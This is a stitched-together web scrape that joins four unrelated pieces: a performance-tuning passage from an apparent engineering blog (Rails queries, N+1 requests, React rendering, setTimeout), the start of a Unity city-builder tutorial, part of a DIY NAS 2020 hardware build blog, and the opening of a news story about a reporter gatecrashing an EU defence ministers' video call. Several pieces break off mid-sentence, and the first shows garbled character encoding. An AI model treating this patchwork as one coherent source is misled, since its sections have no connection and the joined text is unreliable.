<p>On top of that, we should never perform this kind of query:</p>
<div data-language="ruby"><pre><code>scenarios <span>=</span> <span>Scenario</span>
  <span>.</span>joins<span>(</span><span>:tags</span><span>)</span>
  <span>.</span>where<span>(</span><span>"tags.name ILIKE ?"</span><span>,</span> <span>"%<span><span>#{</span>tags<span>}</span></span>%"</span><span>)</span></code></pre></div>
<p>Can you guess why shouldnâ€™t we issue such a query?</p>
<p>Yes! It is because searching off based on a string will never be as fast as the following codes:</p>
<div data-language="ruby"><pre><code>scenarios <span>=</span> <span>Scenario</span><span>.</span>where<span>(</span>tag<span>:</span> <span>Tag</span><span>.</span>find<span>(</span>tag_id<span>)</span><span>)</span></code></pre></div>
<p>The query above is much faster, as we are using the primary key of the <em>tag</em>. No string scanning is needed, thus itâ€™s much more optimized.</p>
<p>At the end, we managed to shorten query execution time from 5~7 seconds down to the neighborhood of 500ms for certain scenarios.</p>
<h2>Avoiding N+1</h2>
<p>Do you believe that we achieved between 39% to 60% speed improvement just by avoiding N+1 queries? That translate to a speed improvement from 16.39 second to around 6.91 second, when the scenario page contains 200 steps.</p>
<p>How did we do that? We used Chrome Dev Tools to discover that we send an HTTP request for each step one-by-one. Why did we do that is because we would like to retrieve additional metadata given a stepâ€™s ID.</p>
<p>This kind of problem is called <a href="https://blog.appsignal.com/2020/06/09/n-plus-one-queries-explained.html">N+1 query issue</a>. Sending a request one by one is almost certainly never a good idea. So, we fixed this issue by sending only one request to retrieve all the metadata. Even better, we further improved it by having the metadata embedded on the pageâ€™s DOM structure so that we donâ€™t have to send another request just to have it.</p>
<h2>Hacking the shouldComponentUpdate and friends</h2>
<p>In the scenario editor page, we have a parent Board component containing many (or zero) <code>Row</code> components. Each <code>Row</code> eventually renders each <code>Step</code> component. A Step component itself has a <code>StepEditor</code> where user can customize or edit some values. An illustration of a step having its editor panel shown, is as follows:</p>

<p>As we can see, within the <code>StepEditor</code> panel, users can customize some data such as by adding a memo field, or by changing the selected value for the <code>When this step fail</code> select box. When they make such changes, our front-end app infrastructure have the changes propagates back up to the parent <code>Board</code> component, as illustrated by the following tree image.</p>

<p>Eventually, React decided to re-render the whole component for any slight changes on our front-end application. This is due to some design decision, indeed.</p>

<p>However, some <code>Row</code> certainly donâ€™t need to be re-rendered, right? So, how can we make the rendering more efficient?</p>
<p>To do that, we dictated the behavior of <code>shouldComponentUpdate</code> by returning <code>false</code> in the <code>Step</code> component, when we believe it doesnâ€™t have to update. This way, we can use certain logic to check if the <code>Step</code> needs to re-render. However, this technique should be done carefully, as itâ€™s very error-prone, since we are the one who direct React when it should or should not render the component. If we put the <code>shouldComponentUpdate</code> in higher up the node, then all of its children wonâ€™t re-render if it returns <code>false</code>. Therefore, this should be done really carefully.</p>
<p>Perhaps, before overriding <code>shouldComponentUpdate</code>, you may want to try giving child elements a <code>key</code> attribute. This isnâ€™t exactly the same technique, but it helps React recognize whether or not thereâ€™s a new leaf to render. This is especially useful and beneficial if the elements are rendered dynamically, for example <a href="https://reactjs.org/docs/lists-and-keys.html">when rendering a list</a> for each item in an array.</p>
<h2>Understanding now and later</h2>
<p>JavaScript is an asynchronous language. It helps if we understand the so pronounced difference between the <em>now</em> and <em>later</em> in its event looping system.</p>
<p>In JavaScript, a <em>later</em> does not have to happen immediately after <em>now</em>. That is, the <em>now</em> is not necessarily blocking the <em>later</em>. That might sounds abstract and philosophical, but perhaps it is easier to observe by using codes. So, please take a look at the following JavaScript snippet:</p>
<div data-language="javascript"><pre><code><span>var</span> scenarioData <span>=</span> <span>ajax</span><span>(</span><span>"https://autify.com/scenarios/1.json"</span><span>)</span>
console<span>.</span><span>log</span><span>(</span>scenarioData<span>)</span></code></pre></div>
<p>In JavaScript, itâ€™s definitely bound to happen that by the time we reach the second line, <code>scenarioData</code> is still <code>undefined</code> , and that is what is going to be printed to the console. That is, the second line is executed without waiting for the first line to be executed in its entirety.</p>
<p>Internally, we may be able to conceptualize JavaScript through the following oversimplified codes:</p>
<div data-language="javascript"><pre><code><span>var</span> event

<span>while</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>futureEvents</span><span>(</span><span>)</span><span>.</span>length <span>&gt;</span> <span>0</span><span>)</span> <span>{</span>
        event <span>=</span> <span>futureEvents</span><span>(</span><span>)</span><span>.</span><span>shift</span><span>(</span><span>)</span>
        <span>event</span><span>(</span><span>)</span>
    <span>}</span>
<span>}</span></code></pre></div>
<p>Each iteration of the loop above is called a <em>tick</em>, within which an <em>event</em> is taken off the queue if there is any, and then executed. Those events are all <em>later</em> things that should become <em>now</em> in our JavaScript codes. As such, the correct way to print the <code>scenarioData</code> is to put this into the tick just after the ajax request completes, or by having a <em>then</em> callback:</p>
<div data-language="javascript"><pre><code><span>ajax</span><span>(</span><span>"https://autify.com/scenarios/1.json"</span><span>,</span> <span>(</span><span>scenarioData</span><span>)</span> <span>=&gt;</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>scenarioData<span>)</span>
<span>}</span><span>)</span></code></pre></div>
<p>We can capitalize this knowledge further by asking ourselves: If JavaScript sees the world as events occurring one after another, where the <em>later</em> does not mean rightly after <em>now</em>, and the <em>now</em> doesnâ€™t mean it will block: can we postpone expensive operations for, simply, 1 millisecond <em>later</em>?</p>
<p>So, instead of the following code:</p>
<div data-language="jsx"><pre><code><span><span><span>&lt;</span><span>Form.Check</span></span> <span>inline</span>
    <span>className</span><span><span>=</span><span>"</span>text-secondary<span>"</span></span>
    <span>type</span><span><span>=</span><span>"</span>checkbox<span>"</span></span>
    <span>checked</span><span><span>=</span><span>{</span> <span>!</span><span>!</span>continuesOnFailure <span>}</span></span>
    <span>onChange</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
        <span>onContinueOnFailureChange</span><span>(</span><span>!</span>continueOnFailure<span>)</span>
    <span>}</span><span>}</span></span> <span>/&gt;</span></span></code></pre></div>
<p>We request that the change be executed in the next tick (also turning this component from a controlled component to become an uncontrolled one):</p>
<div data-language="jsx"><pre><code><span><span><span>&lt;</span><span>Form.Check</span></span> <span>inline</span>
    <span>className</span><span><span>=</span><span>"</span>text-secondary<span>"</span></span>
    <span>type</span><span><span>=</span><span>"</span>checkbox<span>"</span></span>
    <span>defaultChecked</span><span><span>=</span><span>{</span> <span>!</span><span>!</span>continuesOnFailure <span>}</span></span>
    <span>onChange</span><span><span>=</span><span>{</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
        <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>onContinueOnFailureChange</span><span>(</span><span>!</span>continueOnFailure<span>)</span>
        <span>}</span><span>,</span> <span>1</span><span>)</span>
    <span>}</span><span>}</span></span> <span>/&gt;</span></span></code></pre></div>
<p>And yes! With that change, a user clicking on a checkbox will see the change takes effect immediately, instead of waiting for React to re-render 200 strong components so that the toggle turned into the checked state. Instead, what will happen is: the toggle get checked, and React re-render. Or technically speaking, since the change is registered in the next tick, users will see the change in the checkbox first, as the change callback is executed in the next <em>tick</em>. This makes the user experience feels more snappier and faster.</p>
<p>In some case, we even nest <code>setTimeout</code> within <code>setTimeout</code>:</p>
<div data-language="javascript"><pre><code><span>fetch</span><span>(</span>stepsDataUrl<span>)</span>
	<span>.</span><span>then</span><span>(</span><span>response</span> <span>=&gt;</span> response<span>.</span><span>json</span><span>(</span><span>)</span><span>)</span>
    <span>.</span><span>then</span><span>(</span><span>data</span> <span>=&gt;</span> <span>{</span>
    	<span>dispatch</span><span>(</span><span>hideSpinner</span><span>(</span><span>)</span><span>)</span> 
    	<span>dispatch</span><span>(</span><span>showMessage</span><span>(</span><span>"Scenario saved successfully"</span><span>)</span><span>)</span>
        
    	<span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
            <span>dispatch</span><span>(</span><span>setSteps</span><span>(</span>data<span>.</span>steps<span>)</span><span>)</span>
            
            <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
                <span>dispatch</span><span>(</span><span>closeAllDetailPanel</span><span>(</span><span>)</span><span>)</span>
            <span>}</span><span>,</span> <span>1</span><span>)</span>
        <span>}</span><span>,</span> <span>1</span><span>)</span>
	<span>}</span><span>)</span></code></pre></div>
<p>It is important to note that <code>setTimeout</code> does not actually put our callback on the event loop queue. It just set up a timer, and when the timer expires, the environment places our callback back into the event loop, such that in some future <em>tick</em>, the JavaScript engine will execute the event.</p>
<p>In other words, <code>setTimeout</code> may not fire our event with a perfect temporal accuracyâ€”that is, there is no guarantee that our callback is fired …</p></div></div></div>

Not only are they beloved by players, but they also present developers with a special challenge in terms of game design. Despite all the under the hood math involved, though, they can also be a great first choice of game for a beginner to create on their own!</p><p>In this tutorial, we’ll be creating the foundations of a city-building game in Unity. This project will feature a versatile camera controller, different buildings that can be placed, population/job/food simulations, and even a UI to tie it all together. By the end, you’ll be able to easily add in new buildings since we’re going to be using <strong>scriptable objects</strong>. So if you’re ready to develop your own city-building game from scratch, let’s get started.</p><p><img src="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg" alt="the complete city builder game" width="1611" height="906" srcset="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg 1611w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-300x169.jpg 300w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1024x576.jpg 1024w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-768x432.jpg 768w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1536x864.jpg 1536w" sizes="(max-width: 1611px) 100vw, 1611px" data-srcset="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg 1611w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-300x169.jpg 300w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1024x576.jpg 1024w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-768x432.jpg 768w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1536x864.jpg 1536w" data-src="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" data-src-webp="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg.webp" data-srcset-webp="https://coding.degree/wp-content/uploads/2020/11/Capture-15.jpg.webp 1611w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-300x169.jpg 300w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1024x576.jpg.webp 1024w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-768x432.jpg.webp 768w, https://coding.degree/wp-content/uploads/2020/11/Capture-15-1536x864.jpg.webp 1536w"></p><h3><span id="Project_Files"></span>Project Files<span></span></h3><p>In this tutorial, we’ll be needing some assets such as 3D models and textures.</p><ul><li>Download the required assets here.</li><li>Download the complete project here.</li></ul><div><div id="product_countdown_shortcode" data-until_seconds="46376s" data-dates_to="1606780800" data-fade="0" data-labels_years="Years" data-labels_months="Months" data-labels_weeks="Weeks" data-labels_days="Days" data-labels_hours="Hours" data-labels_minutes="Minutes" data-labels_seconds="Seconds" data-labels_year="Year" data-labels_month="Month" data-labels_week="Week" data-labels_day="Day" data-labels_hour="Hour" data-labels_minute="Minute" data-labels_second="Second" data-display_from_top="0"><div><p><span></span><span>Don't miss out!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>For many years now, <a href="https://blog.briancmoses.com/categories/nas-build/" title="Brian's DIY NAS Build Blogs">I’ve been building, blogging, and giving away DIY network-attached storage (NAS) builds</a>. I was started down this path when I couldn’t find a relevant and recent build parts list to follow when I built <a href="https://blog.briancmoses.com/2012/01/do-it-yourself-network-attached-storage.html" title="Building a NAS: Choosing Hardware">my first DIY NAS</a> back in 2012. In blogging about my own experience building my NAS, I surprisingly find myself atop Google’s search rankings for search terms like “DIY NAS”. Ever since, I’ve been regularly building and blogging about my different DIY NAS builds. My perpetual hope is to encourage potential DIY NAS enthusiasts to build and design their own custom DIY NAS solutions.</p>
<p><span data-pullquote="Well I guess I have to build an even more bananas AMD DIY NAS now, don’t I?!">
When I got done with <a href="https://blog.briancmoses.com/2019/03/diy-nas-2019-edition.html" title="DIY NAS: 2019 Edition">last year’s DIY NAS build</a>, I thought that I had built the most bananas over-the-top DIY NAS build that I could possibly imagine. Upon finishing it, I committed to myself that the 2020 DIY NAS build would be far more restrained.</span></p>
<p>But then I built my <a href="https://blog.briancmoses.com/2019/11/diy-nas-econonas-2019.html" title="DIY NAS: 2019 EconoNAS">first AMD-based DIY NAS, the 2019 EconoNAS</a>, and in building that NAS I realized that the extreme flexibility of AMD’s CPU architecture was suited quite well for DIY NAS enthusiasts to take advantage of. When I published last year’s EconoNAS blog, I remarked to myself, Well I guess I have to build an even more bananas AMD DIY NAS now, don’t I?!
</p>
<h3>And then 2020 happened…</h3>
<p>…and thankfully my wife, son, and I remained healthy—something I wish for all of you too. As a <a href="https://www.cdc.gov/diabetes/basics/type1.html" title="Type 1 Diabetes">Type 1 Diabetic</a>, I’m among the highest risk for bad outcomes. As I began working from home, I thought I’d be able to spend a few of the weekly hours that I spent commuting working on blogs instead.</p>
<p><img src="https://blog.briancmoses.com/Images/2020/diynas/covid-19_150.jpg">But what I found was the opposite—surviving a pandemic, being a productive remote worker, plus trying to help keep an eye on my feral 4-year-old son was a tremendous energy drain. I did my best to emulate my amazing wife and focused my efforts on our household, and unfortunately the <em>DIY NAS: 2020 Edition</em> suffered for it.</p>
<p>All of the hardware that I’d purchased so far languished in my “other office” while I re-acclimated to this new normal!</p>
<blockquote><p>If you’ve ordered anything online recently, you’ve certainly noticed that COVID-19 has disrupted a lot of the availability of items. This is especially true of the components in the <em>DIY NAS: 2020 Edition</em>. I was disappointed to see how much of it has been difficult to find in stock. If you decide to emulate this build, please use the comments below and help each other out in finding vendors with the parts in stock—or suitable replacements for hard-to-find components!</p></blockquote>
<h2>Case and Power Supply</h2>
<p><a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/case_150.jpg"></a>For every NAS build, I always like to lead off with the key component, which in most years is the motherboard. Especially with my preference for smaller motherboards and integrated CPUs. But this year is different! In late 2019, <a href="https://www.silverstonetek.com/">SilverStone</a> contacted me and asked if I’d review the <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381</a> (<a href="https://www.silverstonetek.com/product.php?pid=861&amp;area=en" title="SilverStone Technology CS381B Specifications">specs</a>) if they sent one to me.</p>
<p>The <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381</a> is really impressive on paper. There’s room in the case for a total of 12 different hard disk drives. With 8 of those hard drives being accessible in hot-swap drive bays. The case accommodates Micro-ATX, Mini-ITX, and Mini-DTX motherboards. While I prefer smaller cases for my DIY NAS builds, the CS381 is <strong><em>not</em></strong> a large case by any stretch of the imagination. Moreover, its bigger footprint allows it to accommodate cards up to 267mm or even a 240mm radiator for a water-cooling setup.</p>
<p>Of the many components in the <em>DIY NAS: 2020 Edition</em>, I’ve been most excited about getting my hands on the <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381</a>. Will it warrant an update to <a href="https://butterwhat.com/2019/06/16/brians-top-three-diy-nas-cases-as-of-2019.html" title="Brian's Top Three DIY NAS Cases as of 2019">Brian’s Top 3 DIY NAS Cases</a> on <a href="https://butterwhat.com/" title="Butterwhat.com">butterwhat.com</a>? Stay tuned!</p>
<p><a href="https://www.amazon.com/gp/product/B07ZTW7TSW/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=d3d2f4c04fac04b50a9633eb8cd949b1&amp;language=en_US" title="be quiet! BN639 SFX L Power Supply"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/psu_150.jpg"></a>Power supply was a bit of a headache, but only because I didn’t pay attention to the details of the <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381</a> and <a href="https://www.patreon.com/posts/35288825" title="DIY NAS: 2020 Edition Update: Goddamned Power Supply!">initially bought a full-size ATX power supply</a> instead of the SFX or SFX-L power supply that the case supports. I wound up choosing the <a href="https://www.amazon.com/gp/product/B07ZTW7TSW/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=d3d2f4c04fac04b50a9633eb8cd949b1&amp;language=en_US" title="be quiet! BN639 SFX L Power Supply">be quiet! BN639 SFX-L Power Supply</a> primarily because of its wattage and price. I am <strong><em>not</em></strong> a fan of modular power supplies. I’d much rather use a couple zip ties to manage an extraneous power cord or two, rather than have to dig around my office months—or even years—down the road to find where I stored the extra cables. Unfortunately for me there just wasn’t any non-modular option within what I was shopping for. I would’ve considered spending an extra $5-10 for a non-modular option.</p>
<h2>Motherboard, CPU, and CPU Cooler</h2>
<p><a href="https://www.amazon.com/ASRock-X570-4DDR4-HDMI-Motherboard/dp/B07THYPNC1/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=004553e0116e3ba58f4361cfb65039ea&amp;language=en_US" title="ASRock X570M Pro4"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/mobo_150.jpg"></a>One of the things that I was most excited about after selecting the <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381</a> as the case was the additional motherboards that I’d get to shop for. Being able to include Micro-ATX motherboards more than doubled the number of motherboards that met the criteria of what I feel is important for a DIY NAS build. Since I’d already decided I wanted to build a DIY NAS with an AMD CPU and that I’d picked out a case that could support up to 12 hard disk drives, my ideal criteria for the motherboard was:</p>
<ul>
<li>Mini-ITX or Micro-ATX</li>
<li>AMD AMD4 CPU Socket</li>
<li>Support for 12 SATA Devices</li>
<li>Documented support for ECC RAM</li>
<li>Support for M.2 SSD(s)</li>
</ul>
<p>Of the criteria, I knew that the 12 SATA devices and the documented support of ECC RAM would present the biggest challenge. While the AMD Ryzen CPUs support ECC RAM, it’s not necessarily implemented on all of the motherboards nor is it really something that the motherboard’s marketing departments have put a lot of effort including in their marketing materials. In doing my research, the best point of advice I read was to read reviews of the motherboards and focus on whether they tested the ECC functionality.</p>
<p>In regards to the SATA devices, I knew that I wasn’t going to find a motherboard that supported 12 SATA devices—especially at a “reasonable” price point. Moreover, I also wanted to use M.2 SSD(s) for the operating system, and that typically knocks out the use of some of the available SATA controllers on the motherboard.</p>
<p>With all of that in mind, I very quickly narrowed in on the <a href="https://www.amazon.com/ASRock-X570-4DDR4-HDMI-Motherboard/dp/B07THYPNC1/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=004553e0116e3ba58f4361cfb65039ea&amp;language=en_US" title="ASRock X570M Pro4">ASRock X570M Pro4</a> motherboard (<a href="https://www.asrock.com/mb/AMD/X570M%20Pro4/" title="ASRock X570M Pro4 Specifications">specs</a>). In reading about the motherboard, I was confident it supported ECC RAM, and I liked that it had enough onboard SATA to support the <a href="https://www.amazon.com/SilverStone-Technology-Micro-ATX-Mini-DTX-Mini-Itx/dp/B07W8KC3PY/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=8e1469d33fbf023d8b4600aa3bf4c41f&amp;language=en_US" title="SilverStone Technology CS381B">SilverStone CS381’s</a> 8 hot-swap bays. The motherboard very nearly met all of my ideal criteria by itself and at a fairly reasonable price. The only criteria it wasn’t able to meet—support to fill up all of the case’s internal and external drive bays—would get handled in the rest of my hardware purchases.</p>
<p><a href="https://www.amazon.com/gp/product/B07SXMZLP9/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=6e359f333ee8ac23393d8a2cb4b224d2&amp;language=en_US" title="AMD Ryzen 9 3900X"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/cpu_150.jpg"></a>In building a bananas AMD NAS, I instantly scrolled to the top of AMD’s processor offerings and observed to myself, “Now that’s just a bit TOO bananas, Brian.” But in doing a bit of browsing of <a href="https://www.cpubenchmark.net/high_end_cpus.html">benchmarks of high-end CPUs</a>, I was drawn to the price-to-performance of the <a href="https://www.amazon.com/gp/product/B07SXMZLP9/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=6e359f333ee8ac23393d8a2cb4b224d2&amp;language=en_US" title="AMD Ryzen 9 3900X">AMD Ryzen 9 3900X</a> (<a href="https://www.amd.com/en/products/cpu/amd-ryzen-9-3900x" title="AMD Ryzen 9 3900X Specifications">specs</a>).</p>
<p>Moreover, whatever way you slice it, the <a href="https://www.amazon.com/gp/product/B07SXMZLP9/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=6e359f333ee8ac23393d8a2cb4b224d2&amp;language=en_US" title="AMD Ryzen 9 3900X">AMD Ryzen 9 3900X</a> is complete and absolute overkill for the processing power needs of NAS. The selection of this processor really makes the machine capable of much more than just being a NAS. I’d encourage people who follow this blueprint to fully leverage the extra processing power to experiment with virtualization and host things that complement the storage capabilities.</p>

Because I wound up selecting the <a href="https://www.amazon.com/gp/product/B07SXMZLP9/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=6e359f333ee8ac23393d8a2cb4b224d2&amp;language=en_US" title="AMD Ryzen 9 3900X">AMD Ryzen 9 3900X</a>, I opted for what’s widely regarded as one of the best low-profile AM4 CPU cooling solutions; the <a href="https://www.amazon.com/gp/product/B07BKYJDGM/ref=as_li_ss_tl?ie=UTF8&amp;psc=1&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=32b4d3418317dd8c1c1cb06df9b288c5&amp;language=en_US" title="CRYORIG C7 Cu - 47mm Tall, SFF Mini ITX Full Copper CPU Heatsink">CRYORIG C7 Cu</a> (<a href="http://www.cryorig.com/c7cu.php" title="CRYORIG C7 Cu Specifications">specs</a>). The 105W TDP of the CPU convinced me that I’d need to make sure to pack the most amount of cooling in the space I was allowed.</p>
<h2>RAM</h2>
<p><a href="https://www.amazon.com/gp/product/B078N7HC6L/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=531e96513bb9494ee79450dfca94d61f&amp;language=en_US" title="Crucial 16GB DDR4 DIMM 2666 MHz / PC4-21300 ECC (CT16G4WFD8266)"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/ram_100.jpg"></a>Very little expense was spared in the building of the <a href="https://blog.briancmoses.com/2019/03/diy-nas-2019-edition.html" title="DIY NAS: 2019 Edition">DIY NAS: 2019 Edition</a>, but in building it I intentionally saved a few dollars by going with the bare minimum in recommended RAM. In fact, had I experienced any difficulty in the benchmarking of the NAS, I was ready to buy more RAM and talk about both of those decisions.</p>
<p>In making sure this year’s DIY NAS was more bananas than the prior year’s significantly upgrading the RAM was a no-brainer for me. I picked two <a href="https://www.amazon.com/gp/product/B078N7HC6L/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=531e96513bb9494ee79450dfca94d61f&amp;language=en_US" title="Crucial 16GB DDR4 DIMM 2666 MHz / PC4-21300 ECC (CT16G4WFD8266)">16GB DIMMs of DDR4 2666MHz PC4-21300 Unbuffered ECC RAM</a> (<a href="https://www.crucial.com/usa/en/ct16g4wfd8266" title="Crucial 16GB DDR4 DIMM 2666 MHz / PC4-21300 ECC (CT16G4WFD8266) Specifications">specs</a>) for the DIY NAS: 2020 Edition. A total of 32 GB of RAM would be sufficient for the needs of this year’s DIY NAS build, although I would advise the virtual machine enthusiast to consider more, depending on the number and workload of virtual machines they plan to run.</p>
<p>In this year’s DIY NAS, I’d also think that RAM would be one of the places where you’d see some opportunity to find savings. With my prior builds, especially the EconoNAS builds, I’ve been routinely pleased with how everything performs when using RAM that’s at the minimum side of the hardware recommendations.</p>
<h2>Host Bus Adapter and Cables</h2>
<p><a href="https://www.amazon.com/IBM-Serveraid-M1015-Controller-46M0831/dp/B0034DMSO6/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=a416c9151a1a85f531aa0ee1a60d4e5d&amp;language=en_US" title="IBM Serveraid M1015 SAS/SATA Controller 46M0831"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/hba_150.jpg"></a>My ideal motherboard would’ve had enough onboard controllers to support 12 SATA devices and two M.2 SSDs. My ideal motherboard likely doesn’t exist or comes with such a price tag, that I’d never even consider it. Rather than try and find that motherboard, I opted to add a host bus adapter (HBA) to add support for the additional devices that I wanted the <em>DIY NAS: 2020 Edition</em> to support. I chose an <a href="https://www.amazon.com/IBM-Serveraid-M1015-Controller-46M0831/dp/B0034DMSO6/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=a416c9151a1a85f531aa0ee1a60d4e5d&amp;language=en_US" title="IBM Serveraid M1015 SAS/SATA Controller 46M0831">IBM M1015</a> (<a href="https://www-01.ibm.com/common/ssi/rep_ca/0/877/ENUSZG09-0870/ENUSZG09-0870.PDF" title="IBM Serveraid M1015 SAS/SATA Controller 46M0831 Specifications">specs</a>) to add those additional drives. The IBM M1015 is widely recommended for use with FreeNAS/TrueNAS, once you reflash its firmware, and adds support for an additional 8 SATA devices.</p>
<p><a href="https://www.amazon.com/BENFEI-Straight-Locking-Compatible-Driver/dp/B07JFQ2H9R/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=4f08ab575f535284c22b02391ed1827a&amp;language=en_US" title="BENEI SATA3 18 inch Straight-through Cable with Locking Latch (3 pack)"><img src="https://blog.briancmoses.com/Images/2020/diynas/pp/cable1_150.jpg"></a>As always is the case, neither the motherboard nor the case includes enough SATA cables to support all of the drive bays. I complemented the standard SATA cables that are shipped with the motherboard with two <a href="https://www.amazon.com/BENFEI-Straight-Locking-Compatible-Driver/dp/B07JFQ2H9R/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=4f08ab575f535284c22b02391ed1827a&amp;language=en_US" title="BENEI SATA3 18 inch Straight-through Cable with Locking Latch (3 pack)">3-packs of 18” SATA3 cables with locking latches</a>. But because I’d purchased the <a href="https://www.amazon.com/IBM-Serveraid-M1015-Controller-46M0831/dp/B0034DMSO6/ref=as_li_ss_tl?ie=UTF8&amp;linkCode=ll1&amp;tag=diynas2020-20&amp;linkId=a416c9151a1a85f531aa0ee1a60d4e5d&amp;language=en_US" title="IBM Serveraid M1015 SAS/SATA Controller 46M0831">IBM M1015</a>, I’d need more cables than just the extra SATA cables.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
<p>European defense ministers did not expect to be chatting with Daniël Verlaan when they logged into what they thought was a confidential video conference. </p>



<p>Using login information shared on one of the defense ministers' Twitter accounts, the Dutch 31-year-old reporter <a href="https://www.politico.eu/article/dutch-reporter-gatecrashes-eu-defense-ministers-videoconference/">gatecrashed their meeting on Friday</a>, creating a moment of comic relief — combined with a security alert — at a meeting where a classified document on threats facing the EU was on the agenda.</p>



<p>"I don't think I look like a spy. So I understand why ministers were laughing," Verlaan, who works for Dutch media outlet RTL Nieuws, told POLITICO in a call Monday.</p>



<p>The incident exposed problems with the tools that European officials have used to carry on their work during the coronavirus pandemic. It also raises questions about how slowly the Council of the EU has moved to roll out secure conferencing, eight months into the pandemic.</p>



<p>"The fact that you're a minister of defense doesn't mean you're a cybersecurity expert," Verlaan said. "Everyone can make this mistake and that's why I think it's so important to warn people about this."</p>



<h3>Joining the call</h3>



